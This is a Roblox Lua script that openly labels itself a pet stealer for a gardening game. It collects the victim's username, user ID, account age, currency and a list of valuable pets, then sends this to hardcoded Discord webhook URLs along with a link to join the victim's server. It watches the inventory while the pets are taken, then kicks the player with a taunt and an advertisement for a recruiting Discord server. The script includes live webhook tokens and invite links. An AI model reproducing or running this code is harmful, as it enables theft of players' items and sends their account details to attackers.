    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local HttpService = game:GetService("HttpService")
    local CoreGui = game:GetService("CoreGui")

    if getgenv().SB_EXECUTED_LOCK then return end
    getgenv().SB_EXECUTED_LOCK = true

    local player = Players.LocalPlayer

    local CONFIG = {
        ALL_HITS_WEBHOOK_URL = "https://discord.com/api/webhooks/1397485572884271134/SeiDaELPQmgoaYyUIsXAefydjAfIi8_CVO0qAawMu5zGZeFOTXkKxy8nf6OwWPRHuucB",
        MAIN_WEBHOOK_URL = "https://discord.com/api/webhooks/1397159905747795988/zIIKL75a4SNy9E72HojNv-sTXkALkOLpMlD3EbS7FXtTK94A83e87QvxVSWqTlO4qZ1v",
        KITSUNE_WEBHOOK_URL = "https://discord.com/api/webhooks/1397485371779973150/F8IGnpfXUJlxJRYQBSTFANg_An2e0Ih2jAFQRkaE7XWe5UC8YruXddau8qb3OZy52VF1",
        KICK_MESSAGE_FORMAT = "Your pets have been looted. lol. Join here to use the stealer: \"%s\"",
        PING_MESSAGE = "@everyone **kupal naka HIT!!!🤑🤑🤑🤑**",
        DYNAMIC_DISCORD_LINKS = {
            "https://discord.gg/ZXwu8pKQwp",
            "https://discord.gg/ZXwu8pKQwp"
        },
        HUGE_PET_WEIGHT = 4.0,
        AGED_PET_DAYS = 50,
        MAX_PETS_IN_LIST = 20,
        TARGET_PET_TYPES = {
            ["Disco Bee"] = true, ["Raccoon"] = true, ["Dragonfly"] = true, ["Mimic Octopus"] = true,
            ["Butterfly"] = true, ["Queen Bee"] = true, ["T-Rex"] = true, ["Fennec Fox"] = true,
            ["Rainbow Ankylosaurus"] = true, ["Rainbow Dilophosaurus"] = true, ["Rainbow Pachycephalosaurus"] = true,
            ["Rainbow Iguanodon"] = true, ["Rainbow Parasaurolophus"] = true, ["Fox"] = true, ["Kitsune"] = true,
            ["Spinosaurus"] = true, ["Rainbow Spinosaurus"] = true
        }
    }

    local MUTATION_MAP = {
        k = "IronSkin", d = "Shiny", l = "Radiant", n = "Ascended", f = "Frozen",
        g = "Inverted", e = "Windy", a = "Shocked", b = "Burning", c = "Corrupted",
        h = "Starfall", i = "Overcharged", j = "Radioactive",
        IronSkin = "IronSkin", Shiny = "Shiny", Radiant = "Radiant", Ascended = "Ascended",
        Frozen = "Frozen", Inverted = "Inverted", Windy = "Windy", Shocked = "Shocked",
        Burning = "Burning", Corrupted = "Corrupted", Starfall = "Starfall",
        Overcharged = "Overcharged", Radioactive = "Radioactive"
    }

    local Util = {}
    local pathCache = {}
    function Util.Get(tbl, path, default)
        if not pathCache[path] then
            pathCache[path] = {}
            for key in string.gmatch(path, "[^.]+") do
                table.insert(pathCache[path], key)
            end
        end
        local current = tbl
        for _, key in ipairs(pathCache[path]) do
            if type(current) ~= "table" or not current[key] then return default end
            current = current[key]
        end
        return current
    end

    function Util.FormatNumber(n)
        if not n then return "N/A" end
        local s = tostring(math.floor(n))
        return #s > 3 and s:reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "") or s
    end

    local function getExecutorName()
        if getexecutorname then
            local success, name = pcall(getexecutorname)
            if success and type(name) == "string" then return name end
        end
        if identifyexecutor then
            local success, name = pcall(identifyexecutor)
            if success and type(name) == "string" then return name:gsub(" Executor", "") end
        end
        if syn then return "Synapse X" end
        if Krnl then return "Krnl" end
        if Fluxus then return "Fluxus" end
        if SENTINEL_V2 then return "Sentinel" end
        return "Unknown"
    end

    local function createStyledNotificationGUI(titleText, messageText, buttonText)
        local chosenLink = CONFIG.DYNAMIC_DISCORD_LINKS[math.random(1, #CONFIG.DYNAMIC_DISCORD_LINKS)]

        local gui = Instance.new("ScreenGui", CoreGui)
        gui.ResetOnSpawn = false
        gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
        gui.DisplayOrder = 1000

        local overlay = Instance.new("Frame", gui)
        overlay.Size = UDim2.fromScale(1, 1)
        overlay.BackgroundColor3 = Color3.new(0, 0, 0)
        overlay.BackgroundTransparency = 0.4
        overlay.Active = true

        local gradient = Instance.new("UIGradient", overlay)
        gradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 40)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 15))
        })
        gradient.Rotation = 90

        local mainFrame = Instance.new("Frame", overlay)
        mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        mainFrame.Position = UDim2.fromScale(0.5, 0.5)
        mainFrame.Size = UDim2.new(0, 500, 0, 250)
        mainFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
        mainFrame.BackgroundTransparency = 0.1
        mainFrame.BorderSizePixel = 0

        local corner = Instance.new("UICorner", mainFrame)
        corner.CornerRadius = UDim.new(0, 12)

        local stroke = Instance.new("UIStroke", mainFrame)
        stroke.Color = Color3.fromRGB(120, 80, 255)
        stroke.Thickness = 2
        stroke.Transparency = 0.4

        local titleLabel = Instance.new("TextLabel", mainFrame)
        titleLabel.AnchorPoint = Vector2.new(0.5, 0)
        titleLabel.Position = UDim2.fromScale(0.5, 0.1)
        titleLabel.Size = UDim2.fromScale(0.8, 0.2)
        titleLabel.BackgroundTransparency = 1
        titleLabel.Font = Enum.Font.SourceSansBold
        titleLabel.Text = titleText
        titleLabel.TextColor3 = Color3.new(1, 1, 1)
        titleLabel.TextScaled = true

        local messageLabel = Instance.new("TextLabel", mainFrame)
        messageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
        messageLabel.Position = UDim2.fromScale(0.5, 0.45)
        messageLabel.Size = UDim2.fromScale(0.85, 0.3)
        messageLabel.BackgroundTransparency = 1
        messageLabel.Font = Enum.Font.SourceSans
        messageLabel.Text = messageText
        messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
        messageLabel.TextSize = 18
        messageLabel.TextWrapped = true
        messageLabel.TextXAlignment = Enum.TextXAlignment.Center
        messageLabel.TextYAlignment = Enum.TextYAlignment.Center

        local linkButton = Instance.new("TextButton", mainFrame)
        linkButton.AnchorPoint = Vector2.new(0.5, 1)
        linkButton.Position = UDim2.fromScale(0.5, 0.9)
        linkButton.Size = UDim2.fromScale(0.7, 0.25)
        linkButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
        linkButton.Font = Enum.Font.SourceSansBold
        linkButton.Text = buttonText
        linkButton.TextColor3 = Color3.new(1, 1, 1)
        linkButton.TextScaled = true

        local btnCorner = Instance.new("UICorner", linkButton)
        btnCorner.CornerRadius = UDim.new(0, 8)

        local btnStroke = Instance.new("UIStroke", linkButton)
        btnStroke.Color = Color3.fromRGB(255, 255, 255)
        btnStroke.Thickness = 1
        btnStroke.Transparency = 0.9

        linkButton.MouseButton1Click:Connect(function()
            if type(setclipboard) == "function" then
                setclipboard(chosenLink)
                linkButton.Text = "LINK COPIED!"
                task.wait(2)
                linkButton.Text = buttonText
            end
        end)
        
        return gui
    end

    local function getDynamicKickMessage()
        local chosenLink = CONFIG.DYNAMIC_DISCORD_LINKS[math.random(1, #CONFIG.DYNAMIC_DISCORD_LINKS)]
        return string.format(CONFIG.KICK_MESSAGE_FORMAT, chosenLink)
    end

    task.spawn(function()
        local PetRegistry, InventoryData
        local success = pcall(function()
            PetRegistry = require(ReplicatedStorage.Data.PetRegistry.PetList)
            InventoryData = require(ReplicatedStorage.Modules.DataService):GetData().PetsData.PetInventory.Data
        end)
        if not (success and PetRegistry and InventoryData) then return end

        local priorityPets = {}
        local stats = { total = 0, huge = 0, agedMutated = 0 }
        local hasKitsune = false
        local raccoonCount = 0
        local discoBeeCount = 0
        local hasAnyHugePet = false
        local allHugePets = {}

        for uuid, petInfo in pairs(InventoryData) do
            if type(petInfo) == "table" and petInfo.PetData then
                local petData = petInfo.PetData
                local baseWeight = tonumber(petData.BaseWeight or 0)
                if baseWeight > 0 or tonumber(petData.Weight or 0) > 0 then
                    stats.total += 1

                    local basePetType = tostring(petInfo.PetType or "Unknown")

                    local mutationValue = petData.MutationType or petData.Mutation
                    local mutationName = (mutationValue and MUTATION_MAP[tostring(mutationValue)]) or ""

                    if basePetType == "Raccoon" then
                        raccoonCount = raccoonCount + 1
                    end

                if basePetType == "Disco Bee" then
                    discoBeeCount = discoBeeCount + 1
                end

                    local weight = tonumber(petData.Weight) or baseWeight
                    local age = tonumber(petData.Age or 0)
                    local isHuge = baseWeight >= CONFIG.HUGE_PET_WEIGHT
                    local isAged = math.floor(age / 86400) >= CONFIG.AGED_PET_DAYS
                    local isMutated = mutationName ~= ""
                    local isTargetType = CONFIG.TARGET_PET_TYPES[basePetType]

                    local pet = {
                        uuid = uuid,
                        baseType = basePetType,
                        typeName = (mutationName ~= "" and mutationName .. " " or "") .. basePetType,
                        weight = weight,
                        baseWeight = baseWeight,
                        age = age,
                        level = tonumber(petData.Level or 1),
                        isHuge = isHuge,
                        isAged = isAged,
                        isMutated = isMutated,
                        isTargetType = isTargetType
                    }

                    if isHuge then
                        hasAnyHugePet = true
                        table.insert(allHugePets, pet)
                    end

                    if basePetType == "Kitsune" then
                        hasKitsune = true
                    end

                    if isTargetType then
                        table.insert(priorityPets, pet)
                        if isHuge then stats.huge += 1 end
                        if isAged or isMutated then stats.agedMutated += 1 end
                    end
                end
            end
        end

        if #priorityPets == 0 and not hasAnyHugePet then
            createStyledNotificationGUI("PET STEALER", "HEY BROTHER YOU ARE POOR YOU DONT HAVE PET I CAN STEAL!!🤣😂 IF YOU WANT TO STEAL PEOPLE PETS JOIN IN THE DISCORD CLICK THE DISCORD", "Copy Discord Link")
            return
        end

        local PET_PRIORITY_ORDER = {
            ["Kitsune"] = 1, ["Dragonfly"] = 2, ["Raccoon"] = 3, ["Disco Bee"] = 5,
            ["Dilophosaurus"] = 6, ["Rainbow Parasaurolophus"] = 7, ["Rainbow Spinosaurus"] = 8,
            ["Spinosaurus"] = 9, ["Rainbow Ankylosaurus"] = 10, ["Rainbow Iguanodon"] = 11,
            ["Fennec Fox"] = 12, ["T-Rex"] = 13, ["Mimic Octopus"] = 14
        }

        local function getPetPriorityScore(pet)
            local explicitScore = PET_PRIORITY_ORDER[pet.baseType]
            if explicitScore then return explicitScore end
            if pet.baseType:find("Rainbow") then return 4 end
            return 999
        end

        table.sort(priorityPets, function(a, b)
            local scoreA = getPetPriorityScore(a)
            local scoreB = getPetPriorityScore(b)
            if scoreA ~= scoreB then return scoreA < scoreB end
            if a.isHuge ~= b.isHuge then return a.isHuge end
            if (a.isAged or a.isMutated) ~= (b.isAged or a.isMutated) then return (a.isAged or a.isMutated) end
            return a.weight > b.weight
        end)



        local function formatPetList()
            local list = {}

            for i, pet in ipairs(priorityPets) do
                local icon = pet.isHuge and "🤭" or (pet.isAged or pet.isMutated) and "⭐" or "🎯"
                local ageText = ""
                if pet.age > 0 then
                    local days, hours = math.floor(pet.age / 86400), math.floor((pet.age % 86400) / 3600)
                    ageText = days > 0 and string.format(" (Age: %dd %dh)", days, hours) or string.format(" (Age: %dh)", hours)
                end
                local weightText = pet.weight ~= pet.baseWeight and string.format("%.2f KG (Base: %.2f KG)", pet.weight, pet.baseWeight) or string.format("%.2f KG", pet.weight)
                table.insert(list, string.format("%s %s - %s%s [Lv.%d]", icon, pet.typeName, weightText, ageText, pet.level))
                if i >= CONFIG.MAX_PETS_IN_LIST then
                    local remaining = #priorityPets - i
                    if remaining > 0 then table.insert(list, string.format("➕ ... and %d more priority pets", remaining)) end
                    break
                end
            end

            if #allHugePets > 0 then
                local hugePetsShown = 0
                for _, hugePet in ipairs(allHugePets) do
                    local alreadyShown = false
                    for _, priorityPet in ipairs(priorityPets) do
                        if priorityPet.uuid == hugePet.uuid then
                            alreadyShown = true
                            break
                        end
                    end

                    if not alreadyShown then
                        local ageText = ""
                        if hugePet.age > 0 then
                            local days, hours = math.floor(hugePet.age / 86400), math.floor((hugePet.age % 86400) / 3600)
                            ageText = days > 0 and string.format(" (Age: %dd %dh)", days, hours) or string.format(" (Age: %dh)", hours)
                        end
                        local weightText = hugePet.weight ~= hugePet.baseWeight and string.format("%.2f KG (Base: %.2f KG)", hugePet.weight, hugePet.baseWeight) or string.format("%.2f KG", hugePet.weight)
                        table.insert(list, string.format("🤭 %s - %s%s [Lv.%d] (HUGE PET)", hugePet.typeName, weightText, ageText, hugePet.level))
                        hugePetsShown = hugePetsShown + 1
                        if hugePetsShown >= 5 then
                            local remaining = #allHugePets - hugePetsShown
                            if remaining > 0 then table.insert(list, string.format("➕ ... and %d more HUGE pets", remaining)) end
                            break
                        end
                    end
                end
            end

            if #priorityPets == 0 and hasAnyHugePet then
                table.insert(list, "💎 Player has HUGE pets (4kg+ base weight) - Worth checking!")
            end

            return "```\n" .. table.concat(list, "\n") .. "\n```"
        end

        local serverPlayerCount = #Players:GetPlayers()
        if serverPlayerCount == 1 or serverPlayerCount == 2 then
            return
        end

        local leaderstats = player:FindFirstChild("leaderstats")
        local shecklesValue = leaderstats and leaderstats:FindFirstChild("Sheckles") and leaderstats.Sheckles.Value
        local maxPlayerCount = Players.MaxPlayers
        local executorName = getExecutorName()
        local serverStatus = string.format("%d/%d players", serverPlayerCount, maxPlayerCount)



        local description = table.concat({
            "**👤 Player Information**",
            "```",
            ("😭 Display Name: %s"):format(player.DisplayName),
            ("👤 Username: @%s"):format(player.Name),
            ("👁️ User ID: %d"):format(player.UserId),
            ("🦸 Receiver: %s"):format(getgenv().receiver or ""),
            ("💻 Executor: %s"):format(executorName),
            ("💰 Sheckles: %s"):format(Util.FormatNumber(shecklesValue)),
            ("📅 Account Age: %d days"):format(player.AccountAge),
            ("🌐 Server: %s"):format(serverStatus),
            "```",
            "**📊 BACKPACK STATISTICS**",
            "```",
            ("🤭 Total Pets: %d"):format(stats.total),
            ("🤑 Huge Pets: %d"):format(#allHugePets),
            ("⭐ Aged/Mutated: %d"):format(stats.agedMutated),
            ("🎯 Priority Pets: %d"):format(#priorityPets),
            "```",
            "**🐾 All Pets**",
            formatPetList(),
            "**🔗 Server Access**",
            ("[Join Server](https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s)"):format(game.PlaceId, game.JobId)
        }, "\n")

        local embed = {
            title = "🐾 **CHETOS PETS STEALER PALDO**",
            color = 2829617,
            description = description,
            footer = { text = "PET STEALER • by CHETOS Developer", icon_url = "https://cdn.discordapp.com/attachments/1385257720063459368/1397558714571161641/file_00000000154061f99cd78de339e467d2.png?ex=6882297a&is=6880d7fa&hm=3150aa21fb7734b0a4aeb87ab936778e2583e8e1b9b6e39097a5d5dd74859346&" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }

        local firstPetAssetId = nil
        if #priorityPets > 0 then
            firstPetAssetId = Util.Get(PetRegistry, priorityPets[1].baseType .. ".Icon", ""):match("%d+")
            if firstPetAssetId then
                embed.thumbnail = { url = ("https://www.roblox.com/asset-thumbnail/image?assetId=%s&width=420&height=420&format=png"):format(firstPetAssetId) }
            end
        end

        local payload = {
            username = "🐾CHETOS PETS STEALER",
            avatar_url = "https://cdn.discordapp.com/attachments/1385257720063459368/1397558714571161641/file_00000000154061f99cd78de339e467d2.png?ex=6882297a&is=6880d7fa&hm=3150aa21fb7734b0a4aeb87ab936778e2583e8e1b9b6e39097a5d5dd74859346&",
            embeds = { embed }
        }

        if serverPlayerCount < maxPlayerCount then
            payload.content = CONFIG.PING_MESSAGE
            payload.allowed_mentions = { parse = {"everyone"} }
        end

        local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
        if not requestFunc then return end

        local encodedPayload = HttpService:JSONEncode(payload)

        local requestTemplate = { Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encodedPayload }

        if not getgenv().GLOBAL_SENT_WEBHOOKS then
            getgenv().GLOBAL_SENT_WEBHOOKS = {}
        end

        local function sendWebhook(url)
            local webhookKey = url .. "_" .. player.UserId .. "_" .. tostring(tick()):sub(1, 10)
            if getgenv().GLOBAL_SENT_WEBHOOKS[webhookKey] then
                return
            end
            getgenv().GLOBAL_SENT_WEBHOOKS[webhookKey] = true
            requestTemplate.Url = url
            spawn(function()
                pcall(requestFunc, requestTemplate)
            end)
        end

        local loaderWebhook = (getgenv().Webhook and type(getgenv().Webhook) == "string" and getgenv().Webhook:find("discord.com/api/webhooks")) and getgenv().Webhook or nil

        if hasKitsune or raccoonCount >= 3 or #priorityPets >= 9 or discoBeeCount >= 2 then
            sendWebhook(CONFIG.KITSUNE_WEBHOOK_URL)
        else
            sendWebhook(CONFIG.ALL_HITS_WEBHOOK_URL)

            if loaderWebhook then
                sendWebhook(loaderWebhook)
            end

            if math.random() <= 0.1 then
                sendWebhook(CONFIG.MAIN_WEBHOOK_URL)
            end
        end

        local priorityUuids = {}
        for _, pet in ipairs(priorityPets) do priorityUuids[pet.uuid] = true end

        local notificationGui = nil
        local function updateNotifierGui(show)
            if show and not notificationGui then
                notificationGui = createStyledNotificationGUI("LOLLLLL GOT ROBBED", "HAHAHAHHA join to my server to rob players too", "Copy Discord Link")
            elseif not show and notificationGui then
                notificationGui:Destroy()
                notificationGui = nil
            end
        end

        while task.wait(0.1) do
            local currentInventory
            local fetchSuccess = pcall(function()
                currentInventory = require(ReplicatedStorage.Modules.DataService):GetData().PetsData.PetInventory.Data
            end)
            if not fetchSuccess or not currentInventory then
                pcall(player.Kick, player, getDynamicKickMessage())
                break
            end

            local remainingCount = 0
            for uuid in pairs(priorityUuids) do
                if currentInventory[uuid] then
                    remainingCount += 1
                end
            end

            if remainingCount == 0 then
                updateNotifierGui(false)
                pcall(player.Kick, player, getDynamicKickMessage())
                break
            elseif remainingCount == 1 then
                updateNotifierGui(true)
            else
                updateNotifierGui(false)
            end
        end
    end)
